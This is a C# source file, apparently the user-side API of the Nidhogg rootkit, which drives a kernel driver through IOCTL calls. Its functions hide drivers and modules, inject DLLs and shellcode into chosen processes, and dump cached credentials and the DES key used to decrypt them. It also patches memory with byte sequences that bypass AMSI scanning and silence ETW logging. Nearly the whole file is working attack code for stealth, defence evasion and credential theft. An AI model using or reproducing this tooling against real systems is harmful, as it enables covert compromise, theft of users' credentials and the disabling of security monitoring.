using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace NidhoggCSharpApi
{
    internal partial class NidhoggApi
    {
        private string ParsePath(string path)
        {
            if (path.Length == 0)
                return "";

            if (path.Contains("C:\\Windows"))
                return path.Replace("C:\\Windows", "\\SystemRoot");
            else if (path.Contains("C:\\"))
                return path.Replace("C:\\", "\\??\\C:\\");

            return path;
        }

        private NidhoggErrorCodes DriverHiding(string driverName, bool hide)
        {
            if (driverName.Length == 0 || driverName.Length > MAX_PATH)
                return NidhoggErrorCodes.NIDHOGG_INVALID_INPUT;

            HiddenDriverInformation inputHideDriver = new HiddenDriverInformation
            {
                DriverName = ParsePath(driverName),
                Hide = hide
            };

            return NidhoggSendDataIoctl(inputHideDriver, IOCTL_HIDE_UNHIDE_DRIVER);
        }

        public NidhoggErrorCodes HideDriver(string driverName)
        {
            return DriverHiding(driverName, true);
        }

        public NidhoggErrorCodes UnhideDriver(string driverName)
        {
            return DriverHiding(driverName, false);
        }

        public NidhoggErrorCodes DllInject(uint pid, string dllPath, InjectionType injectionType)
        {
            if (pid == 0 || pid == SYSTEM_PID || dllPath.Length == 0 || dllPath.Length > MAX_PATH)
                return NidhoggErrorCodes.NIDHOGG_INVALID_INPUT;

            DllInformation inputInjectDll = new DllInformation
            {
                Pid = pid,
                Type = injectionType,
                DllPath = dllPath
            };

            return NidhoggSendDataIoctl(inputInjectDll, IOCTL_INJECT_DLL);
        }

        public NidhoggErrorCodes ShellcodeInject(uint pid, IntPtr shellcode, uint shellcodeLength, IntPtr parameter1,
            IntPtr parameter2, IntPtr parameter3, InjectionType injectionType)
        {
            if (pid == 0 || pid == SYSTEM_PID || shellcode == IntPtr.Zero || shellcodeLength == 0)
                return NidhoggErrorCodes.NIDHOGG_INVALID_INPUT;

            ShellcodeInformation inputInjectShellcode = new ShellcodeInformation
            {
                Pid = pid,
                Shellcode = shellcode,
                ShellcodeSize = shellcodeLength,
                Parameter1 = parameter1,
                Parameter2 = parameter2,
                Parameter3 = parameter3,
                Type = injectionType
            };

            return NidhoggSendDataIoctl(inputInjectShellcode, IOCTL_INJECT_SHELLCODE);
        }

        public NidhoggErrorCodes HideModule(uint pid, string moduleName)
        {
            if (pid == 0 || pid == SYSTEM_PID || moduleName.Length == 0 || moduleName.Length > MAX_PATH)
                return NidhoggErrorCodes.NIDHOGG_INVALID_INPUT;

            HiddenModuleInformation inputHideModule = new HiddenModuleInformation
            {
                Pid = pid,
                ModuleName = moduleName
            };

            return NidhoggSendDataIoctl(inputHideModule, IOCTL_HIDE_MODULE);
        }

        public (Credentials[] credentials, DesKeyInformation desKey) DumpCredentials()
        {
            // Triggering cache.
            int i;
            bool success = true;
            OutputCredentials currentOutputCreds = new OutputCredentials();
            uint credAmount = 0;
            credAmount = NidhoggRecieveDataIoctl(credAmount, IOCTL_DUMP_CREDENTIALS);

            if (credAmount == 0)
                return (null, new DesKeyInformation());

            // Getting DES key.
            DesKeyInformation desKeyInformation = new DesKeyInformation();
            desKeyInformation = NidhoggRecieveDataIoctl(desKeyInformation, IOCTL_DUMP_CREDENTIALS);

            if (desKeyInformation.Size == 0)
                throw new NidhoggApiException("[-] Failed to dump credentials: Invalid DES key size");

            desKeyInformation.Data = Marshal.AllocHGlobal((int)desKeyInformation.Size);

            if (desKeyInformation.Data == IntPtr.Zero)
                throw new NidhoggApiException("[-] Failed to dump credentials: Failed to allocate DES key memory");

            try
            {
                desKeyInformation = NidhoggSendRecieveDataIoctl(desKeyInformation, IOCTL_DUMP_CREDENTIALS);
            }
            catch (NidhoggApiException e)
            {
                Marshal.FreeHGlobal(desKeyInformation.Data);
                throw e;
            }

            Credentials[] credentials = new Credentials[credAmount];

            for (i = 0; i < credAmount; i++)
            {
                currentOutputCreds.Index = (uint)i;
                currentOutputCreds.Creds.Username.Buffer = IntPtr.Zero;
                currentOutputCreds.Creds.Username.Length = 0;
                currentOutputCreds.Creds.Domain.Buffer = IntPtr.Zero;
                currentOutputCreds.Creds.Domain.Length = 0;
                currentOutputCreds.Creds.EncryptedHash.Buffer = IntPtr.Zero;
                currentOutputCreds.Creds.EncryptedHash.Length = 0;
                currentOutputCreds = NidhoggSendRecieveDataIoctl(currentOutputCreds, IOCTL_DUMP_CREDENTIALS);

                if (currentOutputCreds.Creds.Username.Length == 0)
                {
                    success = false;
                    break;
                }

                currentOutputCreds.Creds.Username.Buffer = Marshal.AllocHGlobal(currentOutputCreds.Creds.Username.Length);

                if (currentOutputCreds.Creds.Username.Buffer == IntPtr.Zero)
                {
                    success = false;
                    break;
                }

                if (currentOutputCreds.Creds.Domain.Length == 0)
                {
                    Marshal.FreeHGlobal(currentOutputCreds.Creds.Username.Buffer);
                    success = false;
                    break;
                }

                currentOutputCreds.Creds.Domain.Buffer = Marshal.AllocHGlobal(currentOutputCreds.Creds.Domain.Length);

                if (currentOutputCreds.Creds.Domain.Buffer == IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(currentOutputCreds.Creds.Username.Buffer);
                    success = false;
                    break;
                }

                if (currentOutputCreds.Creds.EncryptedHash.Length == 0)
                {
                    Marshal.FreeHGlobal(currentOutputCreds.Creds.Domain.Buffer);
                    Marshal.FreeHGlobal(currentOutputCreds.Creds.Username.Buffer);
                    success = false;
                    break;
                }

                currentOutputCreds.Creds.EncryptedHash.Buffer = Marshal.AllocHGlobal(currentOutputCreds.Creds.EncryptedHash.Length);

                if (currentOutputCreds.Creds.EncryptedHash.Buffer == IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(currentOutputCreds.Creds.Domain.Buffer);
                    Marshal.FreeHGlobal(currentOutputCreds.Creds.Username.Buffer);
                    success = false;
                    break;
                }

                currentOutputCreds = NidhoggSendRecieveDataIoctl(currentOutputCreds, IOCTL_DUMP_CREDENTIALS);

                credentials[i] = new Credentials
                {
                    Username = currentOutputCreds.Creds.Username,
                    Domain = currentOutputCreds.Creds.Domain,
                    EncryptedHash = currentOutputCreds.Creds.EncryptedHash
                };
            }

            if (!success)
            {
                if (desKeyInformation.Data != IntPtr.Zero)
                    Marshal.FreeHGlobal(desKeyInformation.Data);

                for (int j = 0; j < i; j++)
                {
                    if (credentials[j].Username.Buffer != IntPtr.Zero)
                        Marshal.FreeHGlobal(credentials[j].Username.Buffer);

                    if (credentials[j].Domain.Buffer != IntPtr.Zero)
                        Marshal.FreeHGlobal(credentials[j].Domain.Buffer);

                    if (credentials[j].EncryptedHash.Buffer != IntPtr.Zero)
                        Marshal.FreeHGlobal(credentials[j].EncryptedHash.Buffer);
                }

                throw new NidhoggApiException("[-] Failed to dump credentials");
            }

            return (credentials, desKeyInformation);
        }

        public NidhoggErrorCodes PatchModule(uint pid, IntPtr patch, uint patchLength, string functionName, string moduleName)
        {
            if (pid == 0 || pid == SYSTEM_PID || moduleName.Length == 0 || moduleName.Length > MAX_PATH ||
                functionName.Length == 0 || patchLength == 0 || patch == IntPtr.Zero)
                return NidhoggErrorCodes.NIDHOGG_INVALID_INPUT;

            PatchedModule inputPatchModule = new PatchedModule
            {
                Pid = pid,
                Patch = patch,
                PatchLength = patchLength,
                FunctionName = functionName,
                ModuleName = moduleName
            };

            return NidhoggSendDataIoctl(inputPatchModule, IOCTL_PATCH_MODULE);
        }

        public NidhoggErrorCodes AmsiBypass(uint pid)
        {
            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            IntPtr patchPtr = Marshal.AllocHGlobal(patch.Length);
            Marshal.Copy(patch, 0, patchPtr, patch.Length);

            NidhoggErrorCodes error = PatchModule(pid, patchPtr, (uint)patch.Length, "AmsiScanBuffer",
                "C:\\Windows\\System32\\Amsi.dll");
            Marshal.FreeHGlobal(patchPtr);
            return error;
        }

        public NidhoggErrorCodes EtwPatch(uint pid)
        {
            byte[] patch = { 0xC3 };
            IntPtr patchPtr = Marshal.AllocHGlobal(patch.Length);
            Marshal.Copy(patch, 0, patchPtr, patch.Length);

            NidhoggErrorCodes error = PatchModule(pid, patchPtr, (uint)patch.Length, "EtwEventWrite",
                               "C:\\Windows\\System32\\ntdll.dll");
            Marshal.FreeHGlobal(patchPtr);
            return error;
        }
    }
}